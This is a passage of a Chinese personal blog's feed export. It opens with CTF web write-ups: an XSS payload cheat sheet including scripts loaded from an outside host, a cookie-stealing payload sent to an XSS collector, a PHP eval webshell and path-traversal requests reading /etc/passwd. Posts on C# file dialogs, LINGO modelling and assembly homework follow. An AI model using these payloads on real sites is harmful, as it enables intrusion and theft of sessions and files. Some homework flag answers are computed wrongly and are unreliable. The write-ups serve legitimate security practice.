class="name">STYLE</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-class">.XSS</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;</span>)<span class="string">&quot;);&#125;</span></span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">class</span>=<span class="string">&quot;XSS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;</span>)<span class="string">&quot;)&#125;</span></span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">BASE</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);//&quot;</span>&gt;</span></span><br><span class="line"> getURL(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)</span><br><span class="line"> a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#x27;XSS&#x27;);&quot;;eval(a+b+c+d);</span><br><span class="line"> <span class="tag">&lt;<span class="name">XML</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"> &quot;&gt; <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">&quot;a();&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);&#125;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&lt;&quot;</span><br><span class="line"> <span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/xss.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag"> &lt;!<span class="attr">--</span>#<span class="attr">exec</span> <span class="attr">cmd</span>=<span class="string">&quot;/bin/echo &#x27;&lt;SCRIPT SRC&#x27;&quot;</span><span class="attr">--</span>&gt;</span><span class="comment">&lt;!--#exec cmd=&quot;/bin/echo &#x27;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&#x27;&quot;--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">SCRIPT</span> =<span class="string">&quot;&gt;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> &#x27;&#x27; <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">SCRIPT</span> &quot;<span class="attr">a</span>=<span class="string">&#x27;&gt;&#x27;</span>&quot; <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;SCRI&quot;</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面的都是xss的payload，这种构造xss的方式应该还有很多，但是学习肯定要从最简单的开始学啊，先学这个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，尝试用payload输入第一个框里面，弹出<code>1</code><br>注册平台，拿到恶意链接，使用下面的payload发送，在xss平台上面拿到cookie的值即为flag</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=<span class="comment">//xss.pt/FeDc&gt;&lt;/sCrIpT&gt;</span></span><br></pre></td></tr></table></figure><p><code>ctfhub&#123;ca231bb3974a47bbdc54c1e0&#125;</code></p><h1 id="2-上传之无验证"><a href="#2-上传之无验证" class="headerlink" title="2.上传之无验证"></a>2.上传之无验证</h1><p>无限制，直接上传php一句话<code>&lt;?php @eval($_POST[hack]);?&gt;</code>，连蚁剑，flag在html目录下，<code>&lt;?php // ctfhub&#123;397c14a9851b9087aeedfd47&#125;</code></p><h1 id="3-上传之前端验证"><a href="#3-上传之前端验证" class="headerlink" title="3.上传之前端验证"></a>3.上传之前端验证</h1><p>前端限制，上传png后直接抓包改后缀名为.php可绕过，也可以直接关js，这里采用第一种方式.<br><img src="/2020/11/24/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web//1.png"><br><img src="/2020/11/24/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web//2.png"><br><code>ctfhub&#123;973f0b7f8a29e85d2a91a1c7&#125;</code></p><p><del>下次更</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>virink_2019_files_share</title>
      <link href="/2020/11/23/virink-2019-files-share/"/>
      <url>/2020/11/23/virink-2019-files-share/</url>
      
        <content type="html"><![CDATA[<p><del>懒狗的一天，死&lt;作业不少&gt;，做个简单题陶冶下情操</del></p><h2 id="1-first-step"><a href="#1-first-step" class="headerlink" title="1.first step"></a>1.first step</h2><p>首先在源码里发现了hint<code>&lt;!-- Hint : flag in f1ag_Is_h3re --&gt;</code></p><p>然后发现&#x2F;upload&#x2F;目录没有关掉<code>http://4eeb1aa9-5baf-46b5-bdd6-53ae42a824a0.node3.buuoj.cn/uploads/</code></p><p>点击里面的<code>preview</code>发现可以下载文件，那就抓下包试一试。</p><h2 id="2-抓包"><a href="#2-抓包" class="headerlink" title="2.抓包"></a>2.抓包</h2><p>抓包发现第一行的请求语句为<code>GET /preview?f=favicon.ico HTTP/1.1</code>。<br>尝试目录穿越，尝试读取<code>/etc/passwd</code>文件<code>GET /preview?f=../../../../../etc/passwd HTTP/1.1</code>。<br><img src="/2020/11/23/virink-2019-files-share//1.png"><br>再次尝试payload</p><p><code>GET /preview?f=../etc../passwd HTTP/1.1</code>，返回<code>&#123;&quot;msg&quot;:&quot;File yetcpasswd not found!&quot;,&quot;code&quot;:1&#125;</code><br><code>GET /preview?f=y../etc.y./passwd HTTP/1.1</code>，返回<code>&#123;&quot;msg&quot;:&quot;File yetc.passwd not found!&quot;,&quot;code&quot;:1&#125;</code></p><p>猜测应为寻找<code>/</code>字符，找到的话，则将<code>/</code>前的两位包含<code>/</code>替换为空。<br>考虑到也许这种过滤只执行一次，就是若上传内容为<code>....//</code>，检测到<code>/</code>，则被替换为<code>../</code>，下一个<code>/</code>会被转义<code>\</code>，造成<code>../</code>，则可使用双写绕过。</p><h2 id="3-flag"><a href="#3-flag" class="headerlink" title="3.flag"></a>3.flag</h2><p>找flag，首先尝试<code>GET /preview?f=....//....//....//....//....//....//etc..//passwd HTTP/1.1</code>拿到文件，再根据提示<br><code>&lt;!-- Hint : flag in f1ag_Is_h3re --&gt;</code>，尝试<code>GET /preview?f=....//....//....//....//....//....//f1ag_Is_h3re HTTP/1.1</code>，返回<code>&#123;&quot;msg&quot;:&quot;File ..\/..\/..\/..\/..\/..\/etc not found!&quot;,&quot;code&quot;:1&#125;</code>，没找到文件，猜测文件在<code>/f1ag_Is_h3re/flag</code>里面，用下面payload获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /preview?f=....//....//....//....//....//....//f1ag_Is_h3re..//flag HTTP/1.1</span><br></pre></td></tr></table></figure><p><img src="/2020/11/23/virink-2019-files-share//2.png" alt="capture the flag"><br><code>flag&#123;33d05b99-8ed6-4b7e-a9f2-6f1a1413d3ae&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Csharp选择文件路径</title>
      <link href="/2020/11/23/Csharp%E9%80%89%E6%8B%A9%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/"/>
      <url>/2020/11/23/Csharp%E9%80%89%E6%8B%A9%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<h2 id="使用浏览按钮选择文件"><a href="#使用浏览按钮选择文件" class="headerlink" title="使用浏览按钮选择文件"></a>使用浏览按钮选择文件</h2><p>借鉴整理于<a href="https://jingyan.baidu.com/article/09ea3edec10aac81afde392f.html">百度知道</a></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 选择文件：</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">SelectPath</span>()    <span class="comment">//这里可以用一个button_click事件来实现</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> path = <span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">var</span> openFileDialog = <span class="keyword">new</span> Microsoft.Win32.OpenFileDialog()</span><br><span class="line">    &#123;</span><br><span class="line">        Filter = <span class="string">&quot;Files (*.*)|*.*&quot;</span><span class="comment">//如果需要筛选txt文件（&quot;Files (*.txt)|*.txt&quot;）</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (openFileDialog.ShowDialog() == <span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        path = openFileDialog.FileName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 选择路径(目录)</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">SelectPath</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> path = <span class="built_in">string</span>.Empty;</span><br><span class="line">    System.Windows.Forms.FolderBrowserDialog fbd = <span class="keyword">new</span> System.Windows.Forms.FolderBrowserDialog();</span><br><span class="line">    <span class="keyword">if</span> (fbd.ShowDialog() == System.Windows.Forms.DialogResult.OK)</span><br><span class="line">    &#123;</span><br><span class="line">        path = fbd.SelectedPath;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c# </tag>
            
            <tag> c#初学者总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lingo编程初探</title>
      <link href="/2020/11/19/lingo%E7%BC%96%E7%A8%8B%E5%88%9D%E6%8E%A2/"/>
      <url>/2020/11/19/lingo%E7%BC%96%E7%A8%8B%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>情深难寿</p></blockquote><p>***&gt;这里学了点lingo，主要是数学建模要用，总不能啥都叫队友做吧，那也太划水了（虽然我喜欢划水，下面是lingo的一些简单的方法，和我不到一个小时在B站学到的小技巧（其实就是能让你理解的那种东西**</p><h2 id="1-基本教程"><a href="#1-基本教程" class="headerlink" title="1.基本教程"></a>1.基本教程</h2><h3 id="1-运算符"><a href="#1-运算符" class="headerlink" title="1.运算符"></a>1.运算符</h3><h3 id="2-lingo段"><a href="#2-lingo段" class="headerlink" title="2.lingo段"></a>2.lingo段</h3><p><del>电脑有点坏了，粘不了了，有需要自己查⑧</del></p><h2 id="2-我自己的学习"><a href="#2-我自己的学习" class="headerlink" title="2.我自己的学习"></a>2.我自己的学习</h2><blockquote><p>我自己学的东西，其实就是举几个例子，尽量解释一下各个语句的含义吧</p></blockquote><h3 id="例一、十个城市之间连接送货的线性规划"><a href="#例一、十个城市之间连接送货的线性规划" class="headerlink" title="例一、十个城市之间连接送货的线性规划"></a>例一、十个城市之间连接送货的线性规划</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">model:</span><br><span class="line">sets:</span><br><span class="line">city/1..10/:u;                                         !两个&quot;..&quot;,别手抖多打了hh;</span><br><span class="line">link(city,city):d,x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">                                                       !对应城市之间的权重;</span><br><span class="line">data:</span><br><span class="line">d=</span><br><span class="line">0  7  4  5  8  6  12  13  11  18</span><br><span class="line">7  0  3  10 9  14 5   14  17  17</span><br><span class="line">4  3  0  5  9  10 21  8   27  12</span><br><span class="line">5  10 5  0  14 9  10  9   23  16</span><br><span class="line">8  9  9  14 0  7  8   7   20  19 </span><br><span class="line">6  14 10 9  7  0  13  5   25  13</span><br><span class="line">12 5  21 10 8  13 0   23  21  18</span><br><span class="line">13 14 8  9  7  5  23  0   18  12</span><br><span class="line">11 17 27 23 20 25 21  18  0   16</span><br><span class="line">18 17 12 16 19 13 18  12  16  0;</span><br><span class="line">enddata</span><br><span class="line"></span><br><span class="line">min=@sum(link:d*x);                                    </span><br><span class="line">@for( city(j) : @sum(city(i)|j #ne# i : x(i,j)) = 1);  !城市j后只有一个城市相连;</span><br><span class="line">@for( city(i) : @sum(city(j)|i #ne# j : x(i,j)) = 1);  !城市i前只有一个城市相连;</span><br><span class="line">@for( link(i,j)|i #ne# j #and# i #gt# 1 : u(i)-u(j)+10*x(i,j)&lt;=9);</span><br><span class="line">@for( link:@bin(x) );</span><br><span class="line">end</span><br></pre></td></tr></table></figure><blockquote><p>注意:lingo中<code>|</code>表示过滤条件，拿下面的这个用例来讲，解释一下<code>|</code>的意义吧</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@for( city(j) : @sum(city(i)|j #ne# i : x(i,j)) = 1);  !城市j后只有一个城市相连;</span><br></pre></td></tr></table></figure><p>这个语句中<code>city(i)|j #ne# i </code>为<code>x(i,j)) = 1</code>数学函数的约束条件，现在就解释这个语句吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">city(i) | j #ne# i </span><br></pre></td></tr></table></figure><blockquote><p>表示city里面j≠i的组合，也是个约束条件吧。感觉数学建模语言里面最难的就是约束条件了吧，真cao。</p></blockquote><p><strong>划重点1</strong></p><p><code>@for( city(j) : @sum(city(i)|j #ne# i : x(i,j)) = 1);  !城市j后只有一个城市相连;</code><br>这里的比较通俗的解释为<code>对于j属于1~10，求在i≠j的条件下，i从1递增到十累加x(i,j)的和为1</code>，这里的数学含义不好解释，让队友搞[&#x2F;笑]</p><p><strong>划重点2</strong><br><code>@for( link(i,j) | i #ne# j #and# i #gt# 1 : u(i)-u(j)+10*x(i,j)&lt;=9);</code><br>这里表示link(i,j)这个集合下满足<code>1&lt;i≠j</code>的所有i和j的值亦需要满足条件<code>u(i)-u(j)+10*x(i,j)&lt;=9</code></p><p><strong>最重要的注意:对于u(i),u代表左边的那个，i代表下标；显然x(i,j)括号里面的i与j表示ij这样的下标，下面是u(i)和x(i,j)的数学表达</strong><br><img src="/2020/11/19/lingo%E7%BC%96%E7%A8%8B%E5%88%9D%E6%8E%A2//1.png"><br><img src="/2020/11/19/lingo%E7%BC%96%E7%A8%8B%E5%88%9D%E6%8E%A2//2.png"><br>差不多明白了，数学建模语言不过如此，我闪电五连鞭直接入门。</p><h2 id="3-有用的链接"><a href="#3-有用的链接" class="headerlink" title="3.有用的链接"></a>3.有用的链接</h2><p><a href="https://www.bilibili.com/video/BV1bt411m7qD?from=search&seid=686665940954612874">B站视频链接(总结的超级好，20分钟胜过自己学一个小时了)</a><br><a href="https://zhuanlan.zhihu.com/p/62259076">B乎文章，总结的似乎也不错</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
            <tag> lingo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编作业</title>
      <link href="/2020/11/18/%E6%B1%87%E7%BC%96%E4%BD%9C%E4%B8%9A/"/>
      <url>/2020/11/18/%E6%B1%87%E7%BC%96%E4%BD%9C%E4%B8%9A/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我可以轻易放过别人，却怎么也不肯放过自己。</p></blockquote><p><strong>没时间了，快上车</strong></p><blockquote><p>这里记录一下我的汇编作业，接下来的不到两个月一定好好学。</p></blockquote><h3 id="习题一"><a href="#习题一" class="headerlink" title="习题一"></a>习题一</h3><h5 id="1-解释和区别下列名词术语"><a href="#1-解释和区别下列名词术语" class="headerlink" title="1.解释和区别下列名词术语"></a>1.解释和区别下列名词术语</h5><p><strong>1)微处理器和微型计算机系统。</strong></p><blockquote><p>微处理器只是一个中央处理器（CPU），由算术逻辑部件(ALU)，累加器和通用寄存器组，程序计数器，时序和控制逻辑部件，内部总线等组成。微处理器不能构成独立工作的系统，也不能独立执行程序。</p></blockquote><blockquote><p>微型计算机由CPU，存储器，输入&#x2F;输出接口电路和系统总线组成，具有计算功能，能独立执行程序，但不能显示或输出，仍不能正常工作。以微型计算机为主体，配上外部输入&#x2F;输出设备及系统软件就构成了微型计算机系统，这样就可以正常工作了。</p></blockquote><p>区别:微处理器不能独立工作，微型计算机可以；微型计算机包含微处理器。</p><p><strong>2)硬件和软件。</strong></p><blockquote><p>硬件:计算机硬件”的简称(中国大陆及香港用语，台湾作硬体)。与“软件”相对。电子计算机系统中所有实体部件和设备的统称。从基本结构上来讲，电脑可以分为五大部分：运算器、存储器、控制器、输入设备、输出设备等。</p></blockquote><blockquote><p>软件:计算机软件，是指计算机程序以及解释和指导使用程序的文档的总和。<code>(后面可不抄)</code>计算机程序包括源程序和目标程序。源程序是指用高级语言或汇编语言编写的程序，目标程序是指源程序经编译或解释加工以后，语言编写的程序，目标程序是指源程序经编译或解释加工以后可以由计算机直接执行的程序。</p></blockquote><p>区别:硬件摸得到，软件摸不到。</p><p><strong>3)系统软件和应用软件。</strong></p><blockquote><p>为了方便地使用机器及其输入输出设备，充分发挥计算机系统的效率，围绕计算机系统本身开发的程序系统叫做系统软件。</p></blockquote><blockquote><p>应用软件是专门为了某种使用目的而编写的程序系统。</p></blockquote><p>区别:应用软件是基于系统软件而建立的，系统软件是应用软件的底层支持。</p><p><strong>4)机器语言、汇编语言和高级语言。</strong></p><blockquote><p>机器语言是计算机能直接运行的语言，是二进制语言，属于低级语言；汇编语言是面向机器的低级语言，不能被机器直接识别，需要编译；高级语言是从人类的逻辑思维角度出发的计算机语言，不能被机器直接识别，需要编译。</p></blockquote><p>区别:计算机语言具有高级语言和低级语言之分。而高级语言又主要是相对于汇编语言而言的，它是较接近自然语言和数学公式的编程，基本脱离了机器的硬件系统，用人们更易理解的方式编写程序。</p><p><strong>5)汇编语言程序和汇编程序。</strong></p><blockquote><p>用汇编语言编写的叫做汇编语言程序，而汇编程序是指把汇编语言书写的程序翻译成与之等价的机器语言程序的翻译程序。</p></blockquote><p>区别:汇编语言程序依赖于汇编程序编译才可运行。</p><p><strong>6)总线、内部总线和系统总线。</strong></p><blockquote><p>总线是一组信号线的集合，它定义了各引线的信号、电机、机械特性，使计算机内部各组成部分之间以及不同的计算机之间建立信号联系，进行信息传送和通信</p></blockquote><blockquote><p>内部总线：在CPU内部，寄存器之间和算术逻辑部件ALU与控制部件之间传输数据所用的总线称为片内总线(即芯片内部的总线)。</p></blockquote><blockquote><p>系统总线：又称内总线或板级总线，是微机中各插件板与系统板之间的总线，用于插件板一级的互联。因为该总线是用来连接微机各功能部件而构成一个完整微机系统的，所以称之为系统总线。</p></blockquote><p>区别:内部总线在cpu内，系统总线在cpu外各插件板与系统板之间，他们都属于总线。</p><h3 id="习题二"><a href="#习题二" class="headerlink" title="习题二"></a>习题二</h3><h5 id="6-试求出下列运算后的各个状态标志，并说明进位标志和溢出标志的区别。"><a href="#6-试求出下列运算后的各个状态标志，并说明进位标志和溢出标志的区别。" class="headerlink" title="6.试求出下列运算后的各个状态标志，并说明进位标志和溢出标志的区别。"></a>6.试求出下列运算后的各个状态标志，并说明进位标志和溢出标志的区别。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1278H+3469H</span><br><span class="line">54E3H-27A0H</span><br><span class="line">3881H+3597H</span><br><span class="line">01E3H-01E3H</span><br></pre></td></tr></table></figure><p><strong>1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1278H+3469H</span><br><span class="line">答:</span><br><span class="line"> 0001 0010 0111 1000</span><br><span class="line">+0011 0100 0110 1001</span><br><span class="line">——————————————————————</span><br><span class="line"> 0100 0110 1110 0001</span><br><span class="line">ZF=0;SF=0;CF=0;OF=0;AF=1;PF=1。</span><br></pre></td></tr></table></figure><p><strong>2</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 0101 0100 1110 0011</span><br><span class="line">+0010 0111 1010 0000</span><br><span class="line">——————————————————————</span><br><span class="line"> 0111 1100 1000 0011</span><br><span class="line">ZF=0;SF=0;CF=0;OF=0;AF=1;PF=1。</span><br></pre></td></tr></table></figure><p><strong>3</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 0011 1000 1000 0001</span><br><span class="line">+0011 0101 1001 0111</span><br><span class="line">——————————————————————</span><br><span class="line"> 0110 1110 0001 1000</span><br><span class="line">ZF=0;SF=0;CF=0;OF=0;AF=1;PF=0。</span><br></pre></td></tr></table></figure><p><strong>4</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 0001 1110 0011</span><br><span class="line">+0001 1110 0011</span><br><span class="line">——————————————————————</span><br><span class="line"> 0011 1100 0110</span><br><span class="line">ZF=0;SF=0;CF=0;OF=0;AF=1;PF=0。</span><br></pre></td></tr></table></figure><blockquote><p>进位标志和溢出标志的区别:进位表示最高位产生进位。溢出表示超出数的表示范围。</p></blockquote><p>进位判断方法：加减时最高位产生进位或借位，代表结果超出无符号数的范围，单字节就是0<code>~</code>255；<br>溢出判断方法：加减时最高位和次高位中有且仅有一个产生进位或借位，代表结果超出有符号数的范围，单字节就是-128<code>~</code>127</p><h5 id="8-什么是逻辑地址？什么是物理地址？他们之间有什么联系？各用在何处？"><a href="#8-什么是逻辑地址？什么是物理地址？他们之间有什么联系？各用在何处？" class="headerlink" title="8.什么是逻辑地址？什么是物理地址？他们之间有什么联系？各用在何处？"></a>8.什么是逻辑地址？什么是物理地址？他们之间有什么联系？各用在何处？</h5><blockquote><p>逻辑地址(LogicalAddress)是指由程序产生的与段相关的偏移地址部分。有时我们也把逻辑地址称为虚拟地址</p></blockquote><blockquote><p>物理地址（Physical Address） 是指出现在CPU外部地址总线上的寻址物理内存的地址信号，是地址变换的最终结果地址。如果启用了分页机制，那么线性地址会使用页目录和页表中的项变换成物理地址。如果没有启用分页机制，那么线性地址就直接成为物理地址了。</p></blockquote><blockquote><p>二者关系：逻辑地址和物理地址相对的。物理地址是唯一的，逻辑地址的相对的。</p></blockquote><h3 id="习题三"><a href="#习题三" class="headerlink" title="习题三"></a>习题三</h3><h5 id="1-已知DS-x3D-2000H，BX-x3D-0100H，SI-x3D-0002H，存储单元-20100H-20103H-依次存放12-34-56-78H，-21200H-21203H-依次存放2A-4C-B7-65H，说明下列每条指令执行后AX寄存器的内容。"><a href="#1-已知DS-x3D-2000H，BX-x3D-0100H，SI-x3D-0002H，存储单元-20100H-20103H-依次存放12-34-56-78H，-21200H-21203H-依次存放2A-4C-B7-65H，说明下列每条指令执行后AX寄存器的内容。" class="headerlink" title="1.已知DS&#x3D;2000H，BX&#x3D;0100H，SI&#x3D;0002H，存储单元[20100H]~[20103H]依次存放12 34 56 78H，[21200H]~[21203H]依次存放2A 4C B7 65H，说明下列每条指令执行后AX寄存器的内容。"></a>1.已知DS&#x3D;2000H，BX&#x3D;0100H，SI&#x3D;0002H，存储单元[20100H]<code>~</code>[20103H]依次存放12 34 56 78H，[21200H]<code>~</code>[21203H]依次存放2A 4C B7 65H，说明下列每条指令执行后AX寄存器的内容。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1)MOV AX,1200H</span><br><span class="line">2)MOV AX,BX</span><br><span class="line">3)MOV AX,[1200H]</span><br><span class="line">4)MOV AX,[BX]</span><br><span class="line">5)MOV AX,[BX+1100H]</span><br><span class="line">6)MOV AX,[BX+SI]</span><br><span class="line">7)MOV AX,[BX][SI+1100H]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1）AX=1200H</span><br><span class="line">(2) AX=0100H</span><br><span class="line">(3）AX=4C2AH ;偏移地址=bx=0100h</span><br><span class="line">(4）AX=3412H ;偏移地址=bx=0100h</span><br><span class="line">(5）AX=4C2AH ;偏移地址=bx+1100h=1200h</span><br><span class="line">(6）AX=7856H ;偏移地址=bx+si=0100h+0002h=0102h</span><br><span class="line">(7）AX=65B7H ;偏移地址=bx+si+1100h=0100h+0002h+1100h=1202h</span><br></pre></td></tr></table></figure><h5 id="6-给出下列各条指令执行后，AL的值以及CF、ZF、SF、OF和PF的状态。"><a href="#6-给出下列各条指令执行后，AL的值以及CF、ZF、SF、OF和PF的状态。" class="headerlink" title="6.给出下列各条指令执行后，AL的值以及CF、ZF、SF、OF和PF的状态。"></a>6.给出下列各条指令执行后，AL的值以及CF、ZF、SF、OF和PF的状态。</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MOV AL,89H</span><br><span class="line">ADD AL,AL</span><br><span class="line">ADD AL,9DH</span><br><span class="line">CMP AL,0BCH</span><br><span class="line">SUB AL,AL</span><br><span class="line">DEC AL</span><br><span class="line">INC AL</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 